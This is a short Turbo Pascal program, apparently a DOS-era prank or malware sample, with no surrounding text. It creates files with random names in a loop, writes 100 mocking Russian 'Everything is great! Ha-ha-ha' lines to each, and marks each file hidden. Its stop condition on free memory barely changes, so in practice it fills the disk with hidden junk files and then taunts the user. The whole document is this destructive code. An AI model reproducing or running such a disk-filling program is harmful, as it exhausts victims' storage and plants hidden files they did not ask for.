uses Dos;
const Symbols:string = '-_$#&@!%()}{~^''abcdefghijklmnopqrstuvwxyz0123456789';
var d,f,l:LongInt;
    NewName:string[12];
    fi:text;
begin
repeat
NewName:='';
for f:=1 to 8 do
  NewName:=NewName+Symbols[Random(Length(Symbols))+1];
NewName:=NewName+'.';
for f:=1 to 3 do
  NewName:=NewName+Symbols[Random(Length(Symbols))+1];
Assign(fi,NewName);
Rewrite(fi);
for d:=1 to 100 do writeln(fi,'Все отлично! Ха-ха-ха-ха-ха-ха-ха-ха-ха-ха-ха-ха-ха-а-а-а-а-а-а-а-а!');
Close(fi);
SetFAttr(fi,faHidden);
until MemAvail<=8000;
writeln('Все отлично!');
end.